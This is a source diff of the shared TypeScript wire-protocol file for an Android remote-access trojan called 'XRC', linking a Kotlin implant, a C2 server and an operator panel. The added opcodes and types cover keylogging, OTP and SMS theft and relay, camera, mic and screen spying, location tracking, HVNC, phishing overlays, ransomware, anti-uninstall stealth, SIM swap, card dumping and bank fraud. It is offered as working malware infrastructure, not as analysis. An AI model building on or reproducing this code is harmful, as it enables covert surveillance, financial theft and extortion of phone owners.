@@ -1,168 +1,236 @@
 /**
- * XRC protocol v1 — single source of truth for implant ↔ server ↔ panel.
- * Imported by the Fastify server and the React panel; the Kotlin implant
- * mirrors this byte-for-byte. Never fork these types.
+ * XRC — eXtreme Red Cell RAT
+ * shared/src/protocol.ts
+ *
+ * Single source of truth for the wire protocol:
+ *   implant (Kotlin) ⇄ C2 server (Fastify + Socket.IO) ⇄ panel (React)
+ *
+ * Rules:
+ *  - zero runtime dependencies
+ *  - all opcodes are lowercase string values (stable across languages)
+ *  - every new field added here must be optional or given a server-side default
  */
 
-export const PROTOCOL_VERSION = 1;
+/** Command opcodes understood by the implant. */
+export enum CMD {
+  // ---- core / lifecycle ----
+  INFO = 'info',
+  KILL = 'kill',
+  WIPE = 'wipe',
+  DRAIN = 'drain',
+  WIPEWATCH = 'wipewatch',
 
-/* ------------------------------------------------------------------ */
-/* Envelope                                                            */
-/* ------------------------------------------------------------------ */
+  // ---- surveillance ----
+  CAMERA = 'camera',
+  MIC = 'mic',
+  SCREEN = 'screen',
+  LOCATION = 'location',
+  CALL = 'call',
 
-export interface Envelope {
-  v: typeof PROTOCOL_VERSION;
-  /** uuid per message, echoed in responses */
-  id: string;
-  t: 'cmd' | 'evt' | 'res';
-  d: unknown;
+  // ---- input capture ----
+  KEYLOG = 'keylog',
+  SMS = 'sms',
+  NOTIF = 'notif',
+  OTP = 'otp',
+
+  // ---- remote control ----
+  HVNC = 'hvnc',
+  FREEZE = 'freeze',
+  INJECT = 'inject',
+  APPKICKER = 'appkicker',
+
+  // ---- overlays / phishing ----
+  OVERLAY = 'overlay',
+  BIOMETRICS = 'biometrics',
+
+  // ---- automation ----
+  AUTOMATA = 'automata',
+
+  // ---- on-device scanners ----
+  WALLET_SCAN = 'wallet_scan',
+  PASSWORD_SCAN = 'password_scan',
+  /** Panel alias — same wire value as PASSWORD_SCAN. */
+  PASS_SCAN = 'password_scan',
+
+  // ---- ransomware ----
+  RANSOM = 'ransom',
+
+  // ---- file system ----
+  FILES = 'files',
+
+  // ---- stealth / persistence / anti-uninstall ----
+  STEALTH = 'stealth',
+
+  // ---- financial suite (Phase 7) ----
+  ATS = 'ats',
+  CLIP = 'clip',
+  CARD = 'card',
+  CRYPTO = 'crypto',
+  SIMSWAP = 'simswap',
+  BANK = 'bank',
+  OTP_RELAY = 'otp_relay',
+  CONTACTS = 'contacts',
+  CALLLOG = 'calllog',
+  KYC = 'kyc',
+  IDSCAN = 'idscan',
+  BILLSCAN = 'billscan',
+  CARDDUMP = 'carddump',
+  CASHOVERLAY = 'cashoverlay',
+  LURES = 'lures',
+  EXCHANGE = 'exchange',
 }
 
-/* ------------------------------------------------------------------ */
-/* Command codes (wire format, implant side)                           */
-/* ------------------------------------------------------------------ */
-
-export const CMD = {
-  PING: '0xPI',
-  INFO: '0xIF',
-  KEYLOG: '0xKL',
-  SMS: '0xSM',
-  NOTIF: '0xNO',
-  OTP: '0xOT',
-  LOCATION: '0xLO',
-  CAMERA: '0xCA',
-  MIC: '0xMI',
-  FILES: '0xFI',
-  SCREEN: '0xSC',
-  GESTURE: '0xGE',
-  TEXT: '0xTX',
-  OVERLAY: '0xOV',
-  FREEZE: '0xFR',
-  RANSOM: '0xRM',
-  WALLET_SCAN: '0xWS',
-  PASS_SCAN: '0xPS',
-  CLIPBOARD: '0xCL',
-  APPS: '0xAP',
-  PERMS: '0xPM',
-  KILL: '0xKW',
-} as const;
-
-export type CmdCode = (typeof CMD)[keyof typeof CMD];
-
-export type GestureType =
-  | 'tap' | 'swipe' | 'long_press'
-  | 'home' | 'back' | 'recents'
-  | 'vol_up' | 'vol_down' | 'power'
-  | 'notifications' | 'quick_settings' | 'screenshot';
-
-/* ------------------------------------------------------------------ */
-/* Command payloads (panel → implant)                                  */
-/* ------------------------------------------------------------------ */
-
-export type Command =
-  | { cmd: typeof CMD.PING }
-  | { cmd: typeof CMD.INFO }
-  | { cmd: typeof CMD.KEYLOG; flush?: boolean }
-  | { cmd: typeof CMD.SMS; action: 'list' | 'send'; to?: string; body?: string }
-  | { cmd: typeof CMD.NOTIF; action: 'enable' | 'disable' | 'list' }
-  | { cmd: typeof CMD.LOCATION; mode: 'once' | 'continuous' | 'stop' }
-  | { cmd: typeof CMD.CAMERA; cam: 'front' | 'rear'; action: 'snap' | 'burst' | 'stop'; durSec?: number }
-  | { cmd: typeof CMD.MIC; action: 'start' | 'stop'; durSec?: number }
-  | { cmd: typeof CMD.FILES; action: 'list' | 'pull' | 'delete'; path?: string }
-  | { cmd: typeof CMD.SCREEN; action: 'start' | 'stop'; fps?: number }
-  | { cmd: typeof CMD.GESTURE; type: GestureType; x?: number; y?: number; x2?: number; y2?: number; durMs?: number }
-  | { cmd: typeof CMD.TEXT; text: string }
-  | { cmd: typeof CMD.OVERLAY; slug: string; url: string }
-  | { cmd: typeof CMD.FREEZE; on: boolean }
-  | { cmd: typeof CMD.RANSOM; note: string; amount: string; currency: string; address: string; hours: number }
-  | { cmd: typeof CMD.WALLET_SCAN }
-  | { cmd: typeof CMD.PASS_SCAN }
-  | { cmd: typeof CMD.CLIPBOARD; action: 'list' | 'watch' | 'swap'; address?: string }
-  | { cmd: typeof CMD.APPS }
-  | { cmd: typeof CMD.PERMS; action: 'grant_all' | 'status' }
-  | { cmd: typeof CMD.KILL; confirm: string };
-
-/* ------------------------------------------------------------------ */
-/* Device state                                                       */
-/* ------------------------------------------------------------------ */
-
+/** Device liveness as tracked by the C2. */
 export type DeviceStatus = 'online' | 'offline' | 'frozen';
 
-export interface DeviceInfo {
-  id: string;
-  name: string;
-  model: string;
-  manufacturer: string;
-  android: string;
-  sdk: number;
-  carrier: string;
-  /** signal strength dBm */
-  signal: number;
-  /** battery percent 0–100 */
-  battery: number;
-  /** battery temp °C */
-  temp: number;
-  ramUsed: number;
-  ramTotal: number;
-  storageFree: number;
-  storageTotal: number;
-  ipLocal: string;
-  ipPublic: string;
-  city: string | null;
-  /** MIUI / One UI / ColorOS / OxygenOS / null */
-  skin: string | null;
-  rooted: boolean;
-  status: DeviceStatus;
-  reconnectAttempts: number;
-  firstSeen: number;
-  lastSeen: number;
+/** A single command targeted at one implant. */
+export interface Command {
+  cmd: CMD;
+  /** Sub-operation for the opcode, e.g. 'start' | 'stop' | 'snap' | 'flush'. */
+  action?: string;
+  /** Overlay slug — must match a hand-written page, never auto-generated. */
+  slug?: string;
+  /** Path/URL the overlay loads. */
+  url?: string;
+  /** Camera selector. */
+  cam?: 'front' | 'rear';
+  /** Duration in seconds (recordings, freeze timers, mic capture…). */
+  duration?: number;
+  /** Screen-stream frames per second. */
+  fps?: number;
+  /** HVNC touch coordinates. */
+  x?: number;
+  y?: number;
+  /** Absolute path for the files module. */
+  path?: string;
+  /** Free-form payload: ransom note, phone number, text to inject… */
+  payload?: string;
+  /** Automata trigger id ('app_open', 'sms_keyword', 'notification', …). */
+  trigger?: string;
+  /** Automata rule matcher. */
+  rule?: Record<string, unknown>;
+  /** Automata effect to apply. */
+  effect?: Record<string, unknown>;
 }
 
+/** Envelope for a command travelling server → implant. */
+export interface CommandMessage {
+  id: string;
+  deviceId: string;
+  command: Command;
+  ts: number;
+}
+
+/** Ack returned by the implant for a delivered command. */
+export interface CommandAck {
+  id: string;
+  deviceId: string;
+  accepted: boolean;
+  error?: string;
+  ts: number;
+}
+
+/** Row shown in the device registry / sidebar. */
 export interface DeviceSummary {
   id: string;
   name: string;
   model: string;
   android: string;
-  carrier: string;
-  signal: number;
-  battery: number;
   status: DeviceStatus;
-  city: string | null;
+  battery: number;
+  signal?: number;
   keylogCount: number;
   otpCount: number;
   lastSeen: number;
 }
 
-/* ------------------------------------------------------------------ */
-/* Events (implant → panel, live)                                      */
-/* ------------------------------------------------------------------ */
+export interface KeylogEntry {
+  ts: number;
+  app: string;
+  text: string;
+}
 
+export interface OtpEntry {
+  ts: number;
+  source: string;
+  code: string;
+}
+
+export interface BiometricEntry {
+  ts: number;
+  type: string;
+  result?: string;
+}
+
+/**
+ * Full device record: identity + live telemetry + module state + recent events.
+ * All telemetry/module fields are optional so an implant that has not yet
+ * reported them does not break the panel or the server.
+ */
+export interface DeviceInfo {
+  id: string;
+  name: string;
+  model: string;
+  brand: string;
+  android: string;
+  sdk: number;
+  buildId?: string;
+  kernel?: string;
+  rooted?: boolean;
+  hooked?: boolean;
+  lastSeen: number;
+  battery: number;
+  temperature?: number;
+  ramFree?: string;
+  storageFree?: string;
+  carrier?: string;
+  signal?: number;
+  localIp?: string;
+  publicIp?: string;
+  lastLat?: number;
+  lastLng?: number;
+  lastLocTime?: number;
+  keylogCount: number;
+  otpCount: number;
+  accessibilityEnabled?: boolean;
+  deviceAdmin?: boolean;
+  overlayActive?: boolean;
+  persistence?: boolean;
+  recentKeylogs?: KeylogEntry[];
+  recentOtps?: OtpEntry[];
+  recentBiometrics?: BiometricEntry[];
+}
+
+/**
+ * Event streamed from implant → server → panel.
+ * Discriminated on `kind`; `deviceId` + `ts` are always present.
+ */
 export type ImplantEvent =
-  | { kind: 'info'; deviceId: string; info: DeviceInfo; ts: number }
-  | { kind: 'keylog'; deviceId: string; app: string; text: string; ts: number }
-  | { kind: 'sms'; deviceId: string; from: string; text: string; ts: number }
-  | { kind: 'notif'; deviceId: string; app: string; text: string; ts: number }
-  | { kind: 'otp'; deviceId: string; source: string; code: string; ts: number }
-  | { kind: 'location'; deviceId: string; lat: number; lng: number; acc: number; ts: number }
-  | { kind: 'capture'; deviceId: string; type: 'camera' | 'mic' | 'screen'; ref: string; ts: number }
-  | { kind: 'scan'; deviceId: string; type: 'wallet' | 'password'; payload: Record<string, unknown>; ts: number }
-  | { kind: 'status'; deviceId: string; status: DeviceStatus; attempts: number; ts: number };
+  | { kind: 'info'; deviceId: string; ts: number; info: Partial<DeviceInfo> }
+  | { kind: 'keylog'; deviceId: string; ts: number; app: string; text: string }
+  | { kind: 'sms'; deviceId: string; ts: number; from: string; text: string }
+  | { kind: 'notif'; deviceId: string; ts: number; app: string; text: string }
+  | { kind: 'otp'; deviceId: string; ts: number; source: string; code: string }
+  | { kind: 'location'; deviceId: string; ts: number; lat: number; lng: number; accuracy?: number }
+  | { kind: 'capture'; deviceId: string; ts: number; type: 'camera' | 'mic' | 'screen'; url?: string; size?: number }
+  | { kind: 'scan'; deviceId: string; ts: number; type: 'wallet' | 'password'; results?: unknown }
+  | { kind: 'status'; deviceId: string; ts: number; status: DeviceStatus }
+  | { kind: 'error'; deviceId: string; ts: number; message: string };
 
-/* ------------------------------------------------------------------ */
-/* REST API                                                           */
-/* ------------------------------------------------------------------ */
-
+/** Standard JSON envelope for all REST endpoints. */
 export interface ApiRes<T = unknown> {
   success: boolean;
   data?: T;
   error?: string;
 }
 
+/** GET /api/devices */
 export interface DevicesRes {
   devices: DeviceSummary[];
   total: number;
 }
 
+/** GET /api/stats */
 export interface StatsRes {
   totalDevices: number;
   online: number;
@@ -170,15 +238,20 @@ export interface StatsRes {
   keylogs24h: number;
   otps24h: number;
   captures24h: number;
-  overlaysServed: number;
-  byStatus: Record<DeviceStatus, number>;
   byModel: Record<string, number>;
 }
 
+/** One row in the C2 event log. */
 export interface LogEntry {
-  id: number;
+  id: string;
   ts: number;
-  type: 'keylog' | 'otp' | 'sms' | 'notif' | 'command' | 'system' | 'danger' | 'ok' | 'warn';
-  deviceId: string | null;
-  text: string;
-  }
+  deviceId: string;
+  kind: string;
+  message: string;
+}
+
+/** Payload the implant sends on first connect (registration). */
+export interface ImplantHello {
+  device: DeviceInfo;
+  sessionKey?: string;
+}
